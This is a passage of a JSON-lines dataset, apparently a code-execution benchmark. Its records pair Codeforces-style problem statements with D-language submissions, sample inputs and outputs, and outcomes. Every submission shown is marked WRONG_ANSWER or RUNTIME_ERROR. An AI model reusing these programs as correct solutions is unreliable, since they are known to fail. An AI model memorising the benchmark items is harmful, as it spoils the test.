first board of the fence has an arbitrary length, and the length of each subsequent board equals the width of the previous one In other words, the fence is considered beautiful, if the type of the i-th board in the fence is different from the i-1-th board's type; besides, the i-th board's length is equal to the i-1-th board's width (for all i, starting from 2).Now Vasya wonders, how many variants of arranging a fence for his land exist. Your task is to count the number of different beautiful fences of length l.Two fences will be considered the same if the corresponding sequences of fence boards types and rotations are the same, otherwise the fences are different. Since the sought number can be large enough, you need to calculate the answer modulo 1000000007 (10^9+7).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and l (1\u2264n\u2264100,1\u2264l\u22643000) \u2014 the number of different board types and the fence length, correspondingly. Next n lines contain descriptions of board types: the i-th line contains two integers ai and bi (1\u2264ai,bi\u2264100) \u2014 the sizes of the board of the i-th type. All numbers on the lines are separated by spaces.\n","output_spec":"Print a single integer \u2014 the sought number of variants modulo 1000000007 (10^9+7).\n","notes":"In the first sample there are exactly two variants of arranging a beautiful fence of length 3: \n  As the first fence board use the board of the first type of length 1 and width 2. As the second board use board of the second type of length 2 and width 3.  Use one board of the second type after you turn it. That makes its length equal 3, and width \u2014 2. ","sample_inputs":["2 3\n1 2\n2 3\n","1 2\n2 2\n","6 6\n2 1\n3 2\n2 5\n3 3\n5 1\n2 1\n"],"sample_outputs":["2\n","1\n","20\n"]}
{"difficulty":1800,"lang":"D","lang_cluster":"d","src_uid":"271_D","submission_id":"23235973","tags":["data+structures","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"import core.bitop;\r\nimport core.checkedint;\r\nimport core.simd;\r\nimport core.stdc.stdlib;\r\nimport core.stdc.string;\r\nimport std.algorithm;\r\nimport std.array;\r\nimport std.ascii;\r\nimport std.bigint;\r\nimport std.bitmanip;\r\nimport std.complex;\r\nimport std.container;\r\nimport std.conv;\r\nimport std.datetime;\r\nimport std.format;\r\nimport std.functional;\r\nimport std.math;\r\nimport std.meta;\r\nimport std.numeric;\r\nimport std.random;\r\nimport std.range;\r\nimport std.regex;\r\nimport std.stdio;\r\nimport std.string;\r\nimport std.typecons;\r\nimport std.variant;\r\n\r\n__gshared:\r\n\r\nbool read(T...)(T ptrs) if (ptrs.length > 0) {\r\n    return readf(' ' ~ replicate(\"%s \", ptrs.length), ptrs) == ptrs.length;\r\n}\r\n\r\nT[ ] allocate(T)(size_t n) {\r\n    return (cast(T*)malloc(n * T.sizeof))[0 .. n];\r\n}\r\n\r\nauto pairwise(R)(R range) if (isForwardRange!R) {\r\n    return lockstep(range, dropOne(range));\r\n}\r\n\r\nstruct Node {\r\n    int len;\r\n    Node*[char] next;\r\n    Node* link;\r\n    int[int] dp;\r\n\r\n    Node* append(char c, Node* last) {\r\n        auto cur = createNode(Node(last.len + 1));\r\n        for (; last !is null && c !in last.next; last = last.link)\r\n            last.next[c] = cur;\r\n        if (last is null) {\r\n            cur.link = &this;\r\n            return cur;\r\n        }\r\n        auto q = last.next[c];\r\n        if (q.len == last.len + 1) {\r\n            cur.link = q;\r\n            return cur;\r\n        }\r\n        auto clone = createNode(*q);\r\n        clone.len = last.len + 1;\r\n        cur.link = q.link = clone;\r\n        for (; last !is null && last.next.get(c, null) == q; last = last.link)\r\n            last.next[c] = clone;\r\n        return cur;\r\n    }\r\n\r\n    int calc(int badTaken) {\r\n        if (badTaken > k)\r\n            return 0;\r\n        if (auto p = badTaken in dp)\r\n            return *p;\r\n        int result = 1;\r\n        foreach (c, node; next)\r\n            result += node.calc(badTaken + (good[c - 'a'] == '0'));\r\n        dp[badTaken] = result;\r\n        return result;\r\n    }\r\n}\r\n\r\nchar[1501] _s;\r\nchar[ ] s;\r\nchar[27] good;\r\nint k;\r\nint nodesSize;\r\nNode[3000] nodes;\r\n\r\nauto createNode()(auto ref Node node) {\r\n    nodes[nodesSize] = node;\r\n    return &nodes[nodesSize++];\r\n}\r\n\r\nvoid main() {\r\n    while (true) {\r\n        s = _s[ ];\r\n        readln(s);\r\n        if (s.empty)\r\n            break;\r\n        s = s[0 .. $ - 1];\r\n        auto temp = good[ ];\r\n        readln(temp);\r\n        read(&k);\r\n\r\n        Node root;\r\n        auto last = &root;\r\n        nodesSize = 0;\r\n        foreach (c; s)\r\n            last = root.append(c, last);\r\n        writeln(root.calc(0) - 1);\r\n    }\r\n}\r\n","description":"You've got string s, consisting of small English letters. Some of the English letters are good, the rest are bad.A substring s[l...r] (1\u2264l\u2264r\u2264|s|) of string s=s1s2...s|s| (where |s| is the length of string s) is string slsl+1...sr.The substring s[l...r] is good, if among the letters sl,sl+1,...,sr there are at most k bad ones (look at the sample's explanation to understand it more clear).Your task is to find the number of distinct good substrings of the given string s. Two substrings s[x...y] and s[p...q] are considered distinct if their content is different, i.e. s[x...y]\u2260s[p...q].","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input is the non-empty string s, consisting of small English letters, the string's length is at most 1500 characters.\nThe second line of the input is the string of characters \"0\" and \"1\", the length is exactly 26 characters. If the i-th character of this string equals \"1\", then the i-th English letter is good, otherwise it's bad. That is, the first character of this string corresponds to letter \"a\", the second one corresponds to letter \"b\" and so on.\nThe third line of the input consists a single integer k (0\u2264k\u2264|s|) \u2014 the maximum acceptable number of bad characters in a good substring.\n","output_spec":"Print a single integer \u2014 the number of distinct good substrings of string s.\n","notes":"In the first example there are following good substrings: \"a\", \"ab\", \"b\", \"ba\", \"bab\".\nIn the second example there are following good substrings: \"a\", \"aa\", \"ac\", \"b\", \"ba\", \"c\", \"ca\", \"cb\".\n","sample_inputs":["ababab\n01000000000000000000000000\n1\n","acbacbacaa\n00000000000000000000000000\n2\n"],"sample_outputs":["5\n","8\n"]}
{"difficulty":2100,"lang":"D","lang_cluster":"d","src_uid":"295_C","submission_id":"3513969","tags":["combinatorics","dp","graphs","shortest+paths"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.algorithm;\r\nimport std.container;\r\nimport std.exception;\r\nimport std.math;\r\nimport std.stdio;\r\nimport std.string;\r\nimport std.typecons;\r\n\r\nimmutable int MAX_N = 54;\r\nimmutable int MOD = 1_000_000_007;\r\n\r\nlong [MAX_N] [MAX_N] c;\r\n\r\nvoid main ()\r\n{\r\n    foreach (i; 0..MAX_N)\r\n    {\r\n        c[i][0] = 1;\r\n        foreach (j; 1..i + 1)\r\n        {\r\n            c[i][j] = (c[i - 1][j - 1] + c[i - 1][j]) % MOD;\r\n        }\r\n    }\r\n\r\n    int n, k;\r\n    while (readf (\" %s %s\", &n, &k) > 0)\r\n    {\r\n        auto a = new int [n];\r\n        k \/= 50;\r\n        int x = 0;\r\n        int y = 0;\r\n        foreach (i; 0..n)\r\n        {\r\n            readf (\" %s\", &a[i]);\r\n            a[i] \/= 50;\r\n            if (a[i] == 1)\r\n            {\r\n                x++;\r\n            }\r\n            else if (a[i] == 2)\r\n            {\r\n                y++;\r\n            }\r\n            else\r\n            {\r\n                enforce (false);\r\n            }\r\n        }\r\n\r\n        alias Tuple !(int, \"b\", int, \"x\", int, \"y\") state;\r\n        alias Tuple !(int, \"dist\", int, \"num\") value;\r\n        state [] q;\r\n        q.reserve (2 * (x + 1) * (y + 1));\r\n        auto f = new value [] [] [] (2, x + 1, y + 1);\r\n\r\n        f[0][0][0] = value (0, 1);\r\n        q ~= state (0, 0, 0);\r\n        while (q.length > 0)\r\n        {\r\n            state cur = q[0];\r\n            q = q[1..$];\r\n            int cb = cur.b;\r\n            int cx = cur.x;\r\n            int cy = cur.y;\r\n            int cd = f[cb][cx][cy].dist + 1;\r\n            int cn = f[cb][cx][cy].num;\r\n            debug {writefln (\"%s %s %s\", cb, cx, cy);}\r\n            int nb = 1 - cb;\r\n            foreach (dx; 0..x + 1)\r\n            {\r\n                foreach (dy; 0..y + 1)\r\n                {\r\n                    if (!dx && !dy)\r\n                    {\r\n                        continue;\r\n                    }\r\n                    if (dx + dy * 2 > k)\r\n                    {\r\n                        break;\r\n                    }\r\n                    int nx, ny;\r\n                    long mult;\r\n                    if (cb) \/\/ back\r\n                    {\r\n                        nx = cx - dx;\r\n                        ny = cy - dy;\r\n                        mult = (c[cx][dx] *\r\n                                c[cy][dy]) % MOD;\r\n                        if (nx < 0 || ny < 0)\r\n                        {\r\n                            continue;\r\n                        }\r\n                    }\r\n                    else \/\/ forward\r\n                    {\r\n                        nx = cx + dx;\r\n                        ny = cy + dy;\r\n                        mult = (c[x - cx][dx] *\r\n                                c[y - cy][dy]) % MOD;\r\n                        if (nx > x || ny > y)\r\n                        {\r\n                            continue;\r\n                        }\r\n                    }\r\n                    if (!f[nb][nx][ny].num)\r\n                    {\r\n                        f[nb][nx][ny].dist = cd;\r\n                        q ~= state (nb, nx, ny);\r\n                    }\r\n                    if (f[nb][nx][ny].dist != cd)\r\n                    {\r\n                        continue;\r\n                    }\r\n                    f[nb][nx][ny].num =\r\n                      (f[nb][nx][ny].num +\r\n                       mult * cn) % MOD;\r\n                }\r\n            }\r\n        }\r\n\r\n        writefln (\"%s\", f[1][x][y].dist == int.max ?\r\n                  -1 : f[1][x][y].dist);\r\n        writefln (\"%s\", f[1][x][y].num);\r\n    }\r\n}\r\n","description":"One day Greg and his friends were walking in the forest. Overall there were n people walking, including Greg. Soon he found himself in front of a river. The guys immediately decided to get across the river. Luckily, there was a boat by the river bank, just where the guys were standing. We know that the boat can hold people with the total weight of at most k kilograms.Greg immediately took a piece of paper and listed there the weights of all people in his group (including himself). It turned out that each person weights either 50 or 100 kilograms. Now Greg wants to know what minimum number of times the boat needs to cross the river to transport the whole group to the other bank. The boat needs at least one person to navigate it from one bank to the other. As the boat crosses the river, it can have any non-zero number of passengers as long as their total weight doesn't exceed k.Also Greg is wondering, how many ways there are to transport everybody to the other side in the minimum number of boat rides. Two ways are considered distinct if during some ride they have distinct sets of people on the boat.Help Greg with this problem.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n, k (1\u2264n\u226450,1\u2264k\u22645000) \u2014 the number of people, including Greg, and the boat's weight limit. The next line contains n integers \u2014 the people's weights. A person's weight is either 50 kilos or 100 kilos.\nYou can consider Greg and his friends indexed in some way.\n","output_spec":"In the first line print an integer \u2014 the minimum number of rides. If transporting everyone to the other bank is impossible, print an integer -1.\nIn the second line print the remainder after dividing the number of ways to transport the people in the minimum number of rides by number 1000000007 (10^9+7). If transporting everyone to the other bank is impossible, print integer 0.\n","notes":"In the first test Greg walks alone and consequently, he needs only one ride across the river.\nIn the second test you should follow the plan:\n  transport two 50 kg. people;  transport one 50 kg. person back;  transport one 100 kg. person;  transport one 50 kg. person back;  transport two 50 kg. people. That totals to 5 rides. Depending on which person to choose at step 2, we can get two distinct ways.\n","sample_inputs":["1 50\n50\n","3 100\n50 50 100\n","2 50\n50 50\n"],"sample_outputs":["1\n1\n","5\n2\n","-1\n0\n"]}
{"difficulty":1800,"lang":"D","lang_cluster":"d","src_uid":"301_A","submission_id":"3674250","tags":["constructive+algorithms"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.algorithm;\r\nimport std.container;\r\nimport std.exception;\r\nimport std.functional;\r\nimport std.math;\r\nimport std.range;\r\nimport std.stdio;\r\nimport std.string;\r\nimport std.typecons;\r\n\r\nvoid main ()\r\n{\r\n\tint n;\r\n\twhile (readf (\" %s\", &n) > 0)\r\n\t{\r\n\t\tint m = n * 2 - 1;\r\n\t\tauto a = new int [m];\r\n\t\tint s = 0;\r\n\t\tforeach (i; 0..m)\r\n\t\t{\r\n\t\t\treadf (\" %s\", &a[i]);\r\n\t\t\ts += (a[i] <= 0);\r\n\t\t\ta[i] = abs (a[i]);\r\n\t\t}\r\n\t\tint res = reduce !(\"a + b\") (a);\r\n\t\tif ((n % 2 == 0) && (s % 2 != 0))\r\n\t\t{\r\n\t\t\tres -= 2 * a[0];\r\n\t\t}\r\n\t\twriteln (res);\r\n\t}\r\n}\r\n","description":"Yaroslav has an array, consisting of (2\u00b7n-1) integers. In a single operation Yaroslav can change the sign of exactly n elements in the array. In other words, in one operation Yaroslav can select exactly n array elements, and multiply each of them by -1.Yaroslav is now wondering: what maximum sum of array elements can be obtained if it is allowed to perform any number of described operations?Help Yaroslav.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (2\u2264n\u2264100). The second line contains (2\u00b7n-1) integers \u2014 the array elements. The array elements do not exceed 1000 in their absolute value.\n","output_spec":"In a single line print the answer to the problem \u2014 the maximum sum that Yaroslav can get.\n","notes":"In the first sample you do not need to change anything. The sum of elements equals 150.\nIn the second sample you need to change the sign of the first two elements. Then we get the sum of the elements equal to 100.\n","sample_inputs":["2\n50 50 50\n","2\n-1 -100 -1\n"],"sample_outputs":["150\n","100\n"]}
{"difficulty":1900,"lang":"D","lang_cluster":"d","src_uid":"309_C","submission_id":"92878151","tags":["binary+search","bitmasks","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ Cheese-Cracker: cheese-cracker.github.io\nimport std.stdio, std.conv, std.functional, std.string, std.algorithm;\nimport std.container, std.range, std.typecons, std.bigint, std.numeric, std.math, std.random;\n\nalias ll = long;\nalias rbt = redBlackTree;\nalias tup = Tuple!(long, long);\nstatic string[] inp;\nT rd(T = long)(){ while(!inp.length) inp = readln.chomp.split; string res = inp[0]; inp.popFront; return res.to!T; }\nT[] rdarr(T = long)(T fix = 0){ auto r = readln.chomp.split.to!(T[]); r[] += fix; return r; }\n\/*******************************It's a Me, Mario!*******************************************\/\n\n\nll[] totake, bitclust;\n\nll fval(ll endm){\n    ll[34] freq = 0;\n    ll[] memory = bitclust.dup;\n    foreach(i; 0..endm.to!int){ ++freq[totake[i].to!int]; }\n\n    foreach_reverse(k; 0..33){\n        foreach_reverse(i; 0..k+1){\n            ll take = min(freq[i]<<i, memory[k]<<k);\n            ll taken = take\/(1L<<i);\n            freq[i] -= taken;\n            ll left = (memory[k]<<k) - (taken << i);\n            \/* debug if(left)writeln(left, \" \", memory[k]<<k, \" \", memory[k], \" \", k, \" \", take); *\/\n            memory[k] = 0;\n            bitter(left, memory, k);\n        }\n        \/* debug writeln(memory); *\/\n    }\n    \/* debug writeln(endm, \" \", freq); *\/\n    foreach(i; 0..33){\n        if(freq[i]) return 0;\n    }\n    return 1;\n}\n\n\/\/ Bit-terness of TLE\nvoid bitter(ll val, ll[] freq, int maxx){\n    ll num = val;\n    foreach_reverse(i; 0..maxx){\n        ll pow = 1<<i;\n        freq[i] += num\/pow;\n        num %= pow;\n    }\n}\n\n\nvoid play(){\n    int n, m;\n    n = rd!int; m = rd!int;\n    ll[] clusters = rdarr;\n    totake = rdarr;\n    ll takes = 0;\n\n    \/\/ Available units from clusters\n    totake.sort();\n    bitclust.length = 34;\n    foreach(el; clusters){\n        foreach(i; 0..33){\n           if(el & (1L<<i)){\n               ++bitclust[i];\n           }\n        }\n    }\n    writeln(bitclust);\n\n    \/\/ binsearch\n    ll lo = 0; ll hi = m + 1;\n    while(hi - lo > 1){\n        ll midd = (hi + lo)\/2;\n        (fval(midd) >= 1 ? lo : hi) = midd;\n    }\n    writeln(lo);\n}\n\nint main(){\n    long t = 1;\n    \/* t = rd;        \/\/ Toggle! *\/\n    while(t--) play();  \/\/ Let's play!\n    stdout.flush;\n    return 0;\n}\n\n","description":"You get to work and turn on the computer. You start coding and give little thought to the RAM role in the whole process. In this problem your task is to solve one of the problems you encounter in your computer routine.We'll consider the RAM as a sequence of cells that can contain data. Some cells already contain some data, some are empty. The empty cells form the so-called memory clusters. Thus, a memory cluster is a sequence of some consecutive empty memory cells. You have exactly n memory clusters, the i-th cluster consists of ai cells. You need to find memory for m arrays in your program. The j-th array takes 2^bj consecutive memory cells. There possibly isn't enough memory for all m arrays, so your task is to determine what maximum number of arrays can be located in the available memory clusters. Of course, the arrays cannot be divided between the memory clusters. Also, no cell can belong to two arrays.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m (1\u2264n,m\u226410^6). The next line contains n integers a1,a2,...,an (1\u2264ai\u226410^9). The next line contains m integers b1,b2,...,bm (1\u22642^bi\u226410^9).\n","output_spec":"Print a single integer \u2014 the answer to the problem.\n","notes":"In the first example you are given memory clusters with sizes 8, 4, 3, 2, 2 and arrays with sizes 8, 4, 4. There are few ways to obtain an answer equals 2: you can locate array with size 8 to the cluster with size 8, and one of the arrays with size 4 to the cluster with size 4. Another way is to locate two arrays with size 4 to the one cluster with size 8.\nIn the second example you are given 10 memory clusters with size 1 and 6 arrays with size 1. You can choose any 6 clusters and locate all given arrays to them.\n","sample_inputs":["5 3\n8 4 3 2 2\n3 2 2\n","10 6\n1 1 1 1 1 1 1 1 1 1\n0 0 0 0 0 0\n"],"sample_outputs":["2\n","6\n"]}
{"difficulty":1900,"lang":"D","lang_cluster":"d","src_uid":"342_C","submission_id":"4456112","tags":["geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"module main;\r\n\r\nimport std.stdio;\r\nimport std.math;\r\n\r\nint main(string[] args)\r\n{\r\n    int h,r,d,countH,ans;\r\n    readf(\" %d %d\", &h, &r);\r\n    countH = h \/ r;\r\n    d = h % r;\r\n    ans = countH * 2;\r\n    if(countH * r + (sqrt(3f)\/2)*r < h + r)\r\n        ++ans;\r\n    writeln(ans);\r\n    return 0;\r\n}\r\n","description":"A girl named Xenia has a cupboard that looks like an arc from ahead. The arc is made of a semicircle with radius r (the cupboard's top) and two walls of height h (the cupboard's sides). The cupboard's depth is r, that is, it looks like a rectangle with base r and height h+r from the sides. The figure below shows what the cupboard looks like (the front view is on the left, the side view is on the right). Xenia got lots of balloons for her birthday. The girl hates the mess, so she wants to store the balloons in the cupboard. Luckily, each balloon is a sphere with radius . Help Xenia calculate the maximum number of balloons she can put in her cupboard. You can say that a balloon is in the cupboard if you can't see any part of the balloon on the left or right view. The balloons in the cupboard can touch each other. It is not allowed to squeeze the balloons or deform them in any way. You can assume that the cupboard's walls are negligibly thin.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains two integers r,h (1\u2264r,h\u226410^7).\n","output_spec":"Print a single integer \u2014 the maximum number of balloons Xenia can put in the cupboard.\n","notes":null,"sample_inputs":["1 1\n","1 2\n","2 1\n"],"sample_outputs":["3\n","5\n","2\n"]}
{"difficulty":1800,"lang":"D","lang_cluster":"d","src_uid":"363_D","submission_id":"5111137","tags":["binary+search","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.stdio, std.string, std.algorithm;\r\nimport std.conv, std.array;\r\nimport std.container;\r\nimport std.typecons;\r\n\r\nvoid check(T...)(T args) {\r\n    args.map!(to!string).array.join(\" \").writeln;\r\n}\r\n\r\nint f(ref int[] b, ref int[] p, int a, int m) {\r\n    for (int i = 0; i < m; i++) {\r\n        a -= [p[i] - b[m - 1 - i], 0].reduce!max;\r\n        if (a < 0) {\r\n            return -1;\r\n        }\r\n    }\r\n    return a;\r\n}\r\n\r\nvoid main() {\r\n    int n, m, a; readf(\"%d %d %d\\n\", &n, &m, &a);\r\n    int[] b = new int[n];\r\n    int[] p = new int[m];\r\n    foreach (i; 0 .. n) {\r\n        scanf(\"%d\", &b[i]);\r\n    }\r\n    foreach (i; 0 .. m) {\r\n        scanf(\"%d\", &p[i]);\r\n    }\r\n    b.sort!(\"a > b\");\r\n    p.sort;\r\n    int x = 0;\r\n    int l, r;\r\n    int s = 0;\r\n    for (l = 0, r = [n, m].reduce!min + 1; l + 1 < r; ) {\r\n        x = (l + r) \/ 2;\r\n        s = f(b, p, a, x);\r\n        if (s >= 0) {\r\n            l = x;\r\n        } else {\r\n            r = x;\r\n        }\r\n    }\r\n    [l, [0, p[0 .. l].reduce!\"a + b\" - a].reduce!max].check;\r\n}\r\n","description":"A group of n schoolboys decided to ride bikes. As nobody of them has a bike, the boys need to rent them.The renting site offered them m bikes. The renting price is different for different bikes, renting the j-th bike costs pj rubles.In total, the boys' shared budget is a rubles. Besides, each of them has his own personal money, the i-th boy has bi personal rubles. The shared budget can be spent on any schoolchildren arbitrarily, but each boy's personal money can be spent on renting only this boy's bike.Each boy can rent at most one bike, one cannot give his bike to somebody else.What maximum number of schoolboys will be able to ride bikes? What minimum sum of personal money will they have to spend in total to let as many schoolchildren ride bikes as possible?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n, m and a (1\u2264n,m\u226410^5; 0\u2264a\u226410^9). The second line contains the sequence of integers b1,b2,...,bn (1\u2264bi\u226410^4), where bi is the amount of the i-th boy's personal money. The third line contains the sequence of integers p1,p2,...,pm (1\u2264pj\u226410^9), where pj is the price for renting the j-th bike.\n","output_spec":"Print two integers r and s, where r is the maximum number of schoolboys that can rent a bike and s is the minimum total personal money needed to rent r bikes. If the schoolchildren cannot rent any bikes, then r=s=0.\n","notes":"In the first sample both schoolchildren can rent a bike. For instance, they can split the shared budget in half (5 rubles each). In this case one of them will have to pay 1 ruble from the personal money and the other one will have to pay 2 rubles from the personal money. In total, they spend 3 rubles of their personal money. This way of distribution of money minimizes the amount of spent personal money.\n","sample_inputs":["2 2 10\n5 5\n7 6\n","4 5 2\n8 1 1 2\n6 3 7 5 2\n"],"sample_outputs":["2 3\n","3 8\n"]}
{"difficulty":1800,"lang":"D","lang_cluster":"d","src_uid":"37_B","submission_id":"57473706","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"import core.bitop, std.bitmanip;\r\nimport core.checkedint;\r\nimport std.algorithm, std.functional;\r\nimport std.array, std.container;\r\nimport std.bigint;\r\nimport std.conv;\r\nimport std.datetime.stopwatch;\r\nimport std.math, std.numeric;\r\nimport std.range, std.range.interfaces;\r\nimport std.stdio, std.string;\r\nimport std.typecons;\r\n\r\nvoid main()\r\n{\r\n    int n, mx, reg;\r\n    readf(\"%s %s %s\", &n, &mx, &reg);\r\n    readln;\r\n    \r\n    struct scroll { int id, pw, dmg; }\r\n    \r\n    scroll[] scs;\r\n    foreach (i; 1 .. n+1) {\r\n        int pw, dmg;\r\n        readf(\"%s %s\", &pw, &dmg);\r\n        readln;\r\n        \r\n        scs ~= scroll(i, pw, dmg);\r\n    }\r\n    \r\n    auto used = new bool[] (n+1);\r\n    Tuple!(int, int)[] ans;\r\n    int cur = mx;\r\n    int sec = 0;\r\n    int sm = 0;\r\n    for (; sec <= 2100; ++sec) {\r\n        cur = min(cur - sm + reg, mx);\r\n        if (cur <= 0) { break; }\r\n        \r\n        foreach (i, e; scs) {\r\n            if (used[i]) { continue; }\r\n            \r\n            if (e.pw * mx >= cur * 100) {\r\n                used[i] = true;\r\n                sm += e.dmg;\r\n                ans ~= tuple(sec, e.id);\r\n            }\r\n        }\r\n    }\r\n    \r\n    if (sec > 2100) {\r\n        writeln(\"NO\");\r\n        return;\r\n    }\r\n    \r\n    writeln(\"YES\");\r\n    writeln(sec, ' ', ans.length);\r\n    ans.each!(e => writeln(e[0], ' ', e[1]));\r\n}","description":"Vasya\u2019s elder brother Petya loves playing computer games. In one of his favourite computer games Petya reached the final level where a fight with the boss take place.While playing the game Petya found spell scrolls and now he is about to use them. Let\u2019s describe the way fighting goes on this level:1) The boss has two parameters: max \u2014 the initial amount of health and reg \u2014 regeneration rate per second.2) Every scroll also has two parameters: powi \u2014 spell power measured in percents \u2014 the maximal amount of health counted off the initial one, which allows to use the scroll (i.e. if the boss has more than powi percent of health the scroll cannot be used); and dmgi the damage per second inflicted upon the boss if the scroll is used. As soon as a scroll is used it disappears and another spell is cast upon the boss that inflicts dmgi of damage per second upon him until the end of the game.During the battle the actions per second are performed in the following order: first the boss gets the damage from all the spells cast upon him, then he regenerates reg of health (at the same time he can\u2019t have more than max of health), then the player may use another scroll (no more than one per second).The boss is considered to be defeated if at the end of a second he has nonpositive (\u22640) amount of health.Help Petya to determine whether he can win with the set of scrolls available to him and if he can, determine the minimal number of seconds he needs to do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers N, max and reg (1\u2264N,max,reg\u22641000) \u2013\u2013 the amount of scrolls and the parameters of the boss. The next N lines contain two integers powi and dmgi each \u2014 the parameters of the i-th scroll (0\u2264powi\u2264100, 1\u2264dmgi\u22642000). \n","output_spec":"In case Petya can\u2019t complete this level, output in the single line NO.\nOtherwise, output on the first line YES. On the second line output the minimal time after which the boss can be defeated and the number of used scrolls. In the next lines for each used scroll output space-separated number of seconds passed from the start of the battle to the moment the scroll was used and the number of the scroll. Scrolls are numbered starting from 1 in the input order. The first scroll is considered to be available to be used after 0 seconds.\nOutput scrolls in the order they were used. It is not allowed to use scrolls after the boss is defeated.\n","notes":null,"sample_inputs":["2 10 3\n100 3\n99 1\n","2 100 10\n100 11\n90 9\n"],"sample_outputs":["NO\n","YES\n19 2\n0 1\n10 2\n"]}
{"difficulty":2600,"lang":"D","lang_cluster":"d","src_uid":"382_E","submission_id":"5718800","tags":["combinatorics","dp"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.algorithm;\r\nimport std.array;\r\nimport std.container;\r\nimport std.conv;\r\nimport std.exception;\r\nimport std.functional;\r\nimport std.math;\r\nimport std.numeric;\r\nimport std.range;\r\nimport std.stdio;\r\nimport std.string;\r\nimport std.typecons;\r\nimport core.bitop;\r\n\r\nimmutable int MOD   =  1_000_000_007;\r\nimmutable int HALF  = (MOD >> 1) + 1;\r\nimmutable int MAX_N =             54;\r\n\r\nvoid main ()\r\n{\r\n\tauto c = new long [] [] (MAX_N, MAX_N);\r\n\r\n\tforeach (n; 0..MAX_N)\r\n\t{\r\n\t\tc[n][0] = 1;\r\n\t\tforeach (k; 1..n + 1)\r\n\t\t{\r\n\t\t\tc[n][k] = (c[n - 1][k - 1] + c[n - 1][k]) % MOD;\r\n\t\t}\r\n\t}\r\n\r\n\tauto f = new long [] [] [] (MAX_N, MAX_N, 2);\r\n\t\/\/ 0 is occupied, 1 is free\r\n\tf[1][0][1] = 1;\r\n\r\n\tforeach (n; 2..MAX_N)\r\n\t{\r\n\t\tforeach (k; 0..n + 1)\r\n\t\t{\r\n\t\t\tforeach (b; 0..2)\r\n\t\t\t{\r\n\t\t\t\t\/\/ one child\r\n\t\t\t\tint pk = k - (b == 0);\r\n\t\t\t\tif (pk >= 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tlong mult = n - 1;\r\n\t\t\t\t\tf[n][k][b] = (mult *\r\n\t\t\t\t\t    f[n - 1][pk][!b]) % MOD;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\t\/\/ two children\r\n\t\t\tfor (int x = 1; x < n - 1; x++)\r\n\t\t\t{\r\n\t\t\t\tint y = n - 1 - x;\r\n\t\t\t\tassert (x > 0 && y > 0);\r\n\t\t\t\tlong mult = c[n - 1][x];\r\n\t\t\t\tmult = (mult * x) % MOD;\r\n\t\t\t\tmult = (mult * y) % MOD;\r\n\r\n\t\t\t\tfor (int xk = 0; xk <= k; xk++)\r\n\t\t\t\t{\r\n\t\t\t\t\tint yk = void;\r\n\r\n\t\t\t\t\tdebug {if (n == 3 && k == 1)\r\n\t\t\t\t\t    writeln (x, ' ', y, ' ',\r\n\t\t\t\t\t             k, ' ', xk);}\r\n\t\t\t\t\t\/\/ occupied\r\n\t\t\t\t\tyk = k - xk - 1;\r\n\t\t\t\t\tif (yk >= 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tf[n][k][0] = (f[n][k][0] +\r\n\t\t\t\t\t\t    (f[x][xk][1] *\r\n\t\t\t\t\t\t    f[y][yk][0]) % MOD *\r\n\t\t\t\t\t\t    mult) % MOD;\r\n\t\t\t\t\t\tif (x < y ||\r\n\t\t\t\t\t\t    (x <= y && xk <= yk))\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tlong mult2 = mult;\r\n\t\t\t\t\t\t\tif (x == y\r\n\t\t\t\t\t\t\t    \/* && xk == yk *\/)\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\tmult2 =\r\n\t\t\t\t\t\t\t\t    (mult2 *\r\n\t\t\t\t\t\t\t\t    HALF) %\r\n\t\t\t\t\t\t\t\t    MOD;\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\tf[n][k][0] =\r\n\t\t\t\t\t\t\t    (f[n][k][0] +\r\n\t\t\t\t\t\t\t    (f[x][xk][1] *\r\n\t\t\t\t\t\t\t    f[y][yk][1]) %\r\n\t\t\t\t\t\t\t    MOD *\r\n\t\t\t\t\t\t\t    mult2) % MOD;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\t\/\/ free\r\n\t\t\t\t\tyk = k - xk;\r\n\t\t\t\t\tif (x < y || (x <= y && xk <= yk))\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tf[n][k][1] = (f[n][k][1] +\r\n\t\t\t\t\t\t    (f[x][xk][0] *\r\n\t\t\t\t\t\t    f[y][yk][0]) % MOD *\r\n\t\t\t\t\t\t    mult) % MOD;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tdebug {writefln (\"f[%s][%s] = %s, %s\",\r\n\t\t\t                 n, k, f[n][k][0], f[n][k][1]);}\r\n\t\t}\r\n\t}\r\n\r\n\tint n, k;\r\n\twhile (readf (\" %s %s\", &n, &k) > 0)\r\n\t{\r\n\t\twriteln ((f[n][k][0] + f[n][k][1]) % MOD);\r\n\t}\r\n}\r\n","description":"Ksenia has her winter exams. Today she is learning combinatorics. Here's one of the problems she needs to learn to solve.How many distinct trees are there consisting of n vertices, each with the following properties:  the tree is marked, that is, the vertices of the tree are numbered from 1 to n;  each vertex of the tree is connected with at most three other vertices, and at the same moment the vertex with number 1 is connected with at most two other vertices;  the size of the tree's maximum matching equals k. Two trees are considered distinct if there are such two vertices u and v, that in one tree they are connected by an edge and in the other tree they are not.Help Ksenia solve the problem for the given n and k. As the answer to the problem can be very huge you should output it modulo 1000000007\u00a0(10^9+7).","input_from":"standard input","output_to":"standard 